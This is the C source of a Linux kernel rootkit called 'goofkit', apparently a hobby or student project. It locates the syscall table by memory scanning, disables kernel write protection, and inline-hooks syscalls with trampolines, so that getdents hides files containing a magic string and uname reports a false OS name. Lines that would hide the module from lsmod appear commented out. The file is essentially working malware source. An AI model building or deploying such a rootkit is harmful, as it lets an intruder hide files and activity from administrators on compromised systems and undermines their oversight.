/*
Project: goofkit
Author: Jack "Hulto" McKenna & Rayne Cafaro
Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.

Task:
## Hide processes ##
*/

#include <linux/err.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/slab.h>
#include <linux/proc_ns.h>
#include <linux/utsname.h>
#include <asm/pgtable.h>
#include <linux/vmalloc.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <linux/socket.h>

//Defining possible range for syscall table to exist
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

//Allow and disallow writing to syscall
#define DISABLE_W_PROTECTED_MEMORY \
	do { \
		preempt_disable(); \
		write_cr0(read_cr0() & (~ 0x10000)); \
	} while (0);
#define ENABLE_W_PROTECTED_MEMORY \
	do { \
		preempt_enable(); \
		write_cr0(read_cr0() | 0x10000); \
	} while (0);


MODULE_LICENSE("GPL");

//Declare vars
psize *sys_call_table;

unsigned char * create_tramp(psize *dst, psize *src, unsigned int id, unsigned int h_len);

int HOOK_LEN = 15;

//Code used to jump to arbitrary addresses
//movabs rax,0x1122334455667788
//mov    rax,rax
//jmp    rax
unsigned char JUMP_TEMPLATE[] = "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\xc0\xff\xe0";

//Struct for each hook
struct Hook{
	unsigned int id;
	unsigned int hook_len;
	//Backup of old code so we can restore it
	unsigned char *original_code;
	//Hook to be inserted into syscall function
	unsigned char *hook;
	//Trampoline that goofy function will call at end
	unsigned char *trampoline;
	//Pointer to the original function
	unsigned char *og_func;
	//Pointer to the new function?
	unsigned char *new_func;
	//Paused or not
	unsigned char paused;
};

//Struct used by the uname syscall
struct utsname {
	char sysname[sizeof(utsname()->sysname)];    /* Operating system name (e.g., "Linux") */
	char nodename[sizeof(utsname()->nodename)];   /* Name within "some implementation-defined network" */
	char release[sizeof(utsname()->release)];    /* Operating system release (e.g., "2.6.28") */
	char version[sizeof(utsname()->version)];    /* Operating system version */
	char machine[sizeof(utsname()->machine)];    /* Hardware identifier */
#ifdef _GNU_SOURCE
	char domainname[]; /* NIS or YP domain name */
#endif
};

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[];  /* Filename (null-terminated) */
	/* length is actually (d_reclen - 2 -
	    offsetof(struct linux_dirent, d_name) */
	 /*
		char           pad;       // Zero padding byte
		char           d_type;    // File type (only since Linux 2.6.4;
		                          // offset is (d_reclen - 1))
								  */
};

unsigned char *jump;
struct Hook **hooks;


int (*original_getdents)(unsigned int, struct  linux_dirent *, unsigned int);
int (*original_getdents64)(unsigned int, struct linux_dirent *, unsigned int);
int (*original_open)(const char *, int, mode_t);
int (*original_uname)(struct utsname *);

// Iterate over the entire possible range until you find some __NR_close
/* Find the syscall table.
   We will use this to refrence all of the syscalls that we want to overwrite.
   This is a necessary step since in recent versions of linux the syscall table is not exported.*/
psize **find(void) {
	psize **sctable;
	psize i = START_CHECK;
	while (i < END_CHECK) {
		sctable = (psize **) i;
		if (sctable[__NR_close] == (psize *) sys_close) {
			return &sctable[0];
		}
		i += sizeof(void *);
	}
	return NULL;
}

int goofy_uname(struct utsname *buf){
	//Execute original funciton
	//Calling the original function to fill out our buf variable.
	//Any additions need to happen after the inline assembly otherwise
	//The original function will return strange garbage
	int (*func_ptr)(struct utsname *) = (void *)hooks[0]->trampoline;
	int ret = func_ptr(buf);		

	//Value we want to set	
	char tmp[] = "Macos";
	//Setting the value, buf appears to exist in user space so we need
	//to use the copy to user function
	copy_to_user(buf->sysname, tmp, 5);

	//Printk to kernel buffer to make sure everything is working.
	return ret;
}

int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
	//Execute original funciton
	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
	int ret = func_ptr(fd, dire, count), new_len = 0;		
	if(!ret) { return ret; }

	//ret_dire is the dirent struct we're building with allowed files.
	//k_dire is a copy of the dirent array struct in the kernel.
	//cur_dire is a pointer used during iteration to read the values of each dirent.
	struct linux_dirent *ret_dire = kmalloc(ret, GFP_KERNEL);
	if(!ret_dire){ kfree(ret_dire); return -1; }
	struct linux_dirent *k_dire = kmalloc(ret, GFP_KERNEL);
	if(!k_dire){ kfree(k_dire); return -1; }
	struct linux_dirent *cur_dire;
	copy_from_user(k_dire, dire, ret);

	//Iterate through all of dire

	for(int i = 0; i < ret;){
		//Set cur_dire
		unsigned char *ptr = (unsigned char *)k_dire;
		ptr = ptr + i;
		cur_dire = (struct linux_dirent *)ptr;
		//Check if the cur_dire name contains magic string
		if(strstr(cur_dire->d_name, "E1e37") != NULL){
			//DEBUG if does print to buffer
		}else{
			//Else append it to the ret_dire struct
			memcpy((void*)ret_dire+new_len, cur_dire, cur_dire->d_reclen);
			new_len += cur_dire->d_reclen;	
		}
		i += cur_dire->d_reclen;	
	}
	copy_to_user(dire, ret_dire, new_len);
	ret = new_len;
	
	kfree(k_dire);
	kfree(ret_dire);	
	return ret;	
}

//Check that the hook and trampoline are correct.
int goofy_accept(int sockfd, struct sockaddr *addr, int *addrlen){
//	printk("[goof] accept hook\n");
	//Execute original funciton
	//Calling the original function to fill out our buf variable.
	//Any additions need to happen after the inline assembly otherwise
	//The original function will return strange garbage
	int (*func_ptr)(int sockfd, struct sockaddr *addr, int *addrlen) = (void *)hooks[2]->trampoline;
	int ret = func_ptr(sockfd, addr, addrlen);		

	printk("[goof] goofy_accept called\n");
	return ret;
}

/// @param src where original source code is coming from
/// 	and where the new code is going
unsigned char *create_tramp(psize *src, psize *new_func, unsigned int id, unsigned int h_len){
	printk("[goof] hooking %p with %p\n", src, new_func);
	unsigned char *tmp = (unsigned char *)src;
	struct Hook *h = kmalloc(sizeof(struct Hook), GFP_KERNEL);
	
	//Define hook in array
	hooks[id] = h;

	//Define original and new
	h->og_func = (unsigned char *) src;
	h->new_func = (unsigned char *)new_func;

	//TODO auto determine hook length using LDE
	h->hook_len = h_len;

	//~~~~~~~original_code~~~~~~~~~~~	
	//Create a backup of the original code to be
	//used in creating the trampoline and when
	//the rootkits exits to clean up restoring
	//original functions.
	h->original_code = kmalloc(h->hook_len, GFP_KERNEL);
	memcpy(h->original_code, src, h->hook_len);

	//~~~~~~~trampoline~~~~~~~~~~~	
	//Create the trampoline that will be called by
	//the goofy function and jump back into the
	//syscall instructions at offset +hook_len
	//Memory must be executable
	//Allocate enough memory to accomodate the length of the syscall specific hook
	//and also our jump back (15 bytes)
	h->trampoline =  __vmalloc(h->hook_len + HOOK_LEN, GFP_KERNEL, PAGE_KERNEL_EXEC);
	memcpy(h->trampoline, h->original_code, h->hook_len);
	
	//Create jump back
	unsigned char *jump_back = kmalloc(HOOK_LEN, GFP_KERNEL);
	
	//Copy in template
	memcpy(jump_back, JUMP_TEMPLATE, HOOK_LEN);
	
	//Fill in template
	tmp = (unsigned char *)src+h->hook_len;
	memcpy(jump_back+2, &tmp, 8);
	
	//Copy jump back into template
	memcpy(h->trampoline+h->hook_len, jump_back, h->hook_len);

	kfree(jump_back);

	//Verify that trampoline is correct
	//Should be originial code and then jump
	//back to syscall + hook_len	

	printk("\n[goof] trampoline %p\n\t[goof] ", h->trampoline);
    for(int i = 0; i < h->hook_len*2; i++){
        printk("%02x ", h->trampoline[i]);
    }
    printk("\n");

	//~~~~~~~Insert hook into syscall~~~~~~~~~~~	
	unsigned char *jump = kmalloc(h->hook_len, GFP_KERNEL);
	memset(jump, 0x90, h->hook_len);
	memcpy(jump, JUMP_TEMPLATE, HOOK_LEN);
	
	//Fill in template with address of our new function
	//Not sure that +0x5 is required.
	//TODO Test it with and without +0x5
	tmp = ((unsigned char *)new_func);
	memcpy(jump+2, &tmp, 8);	

	//Write hook to syscall table
	printk("[goof] Memory hasn't been written\n");
	DISABLE_W_PROTECTED_MEMORY
	memcpy(src, jump, h->hook_len);
	ENABLE_W_PROTECTED_MEMORY

	return NULL;
}


void remove_tramp(unsigned int id ){
	//Write old code back to the original syscall
	DISABLE_W_PROTECTED_MEMORY
	memcpy(hooks[id]->og_func, hooks[id]->original_code, hooks[id]->hook_len);	
	ENABLE_W_PROTECTED_MEMORY
}

int hooks_count = 2;

static int __init
goof_init(void) {
	//Hide kernel module from lsmod 
//	list_del_init(&__this_module.list);
//	kobject_del(&THIS_MODULE->mkobj.kobj);

	printk("[goof] module loaded\n");

	hooks = kmalloc(sizeof(struct Hook *)*hooks_count, GFP_KERNEL);

	//Find base syscall address	
	sys_call_table = (psize *)find(); 

	//Update table with hooked code
	//Regular way to hook syscall
	//original_uname = sys_call_table[__NR_uname];
	//sys_call_table[__NR_uname] = goofy_uname;

	//Trampolining way to overwrite syscall
	create_tramp((psize*)sys_call_table[__NR_uname], (psize *)goofy_uname, 0, 16);
	create_tramp((psize*)sys_call_table[__NR_getdents], (psize *)goofy_getdents, 1, 15);
	return 0;
}
static void __exit
goof_exit(void) {

	remove_tramp(0);
	remove_tramp(1);
	printk("[goof] module removed\n");
	return;
}

module_init(goof_init);
module_exit(goof_exit);
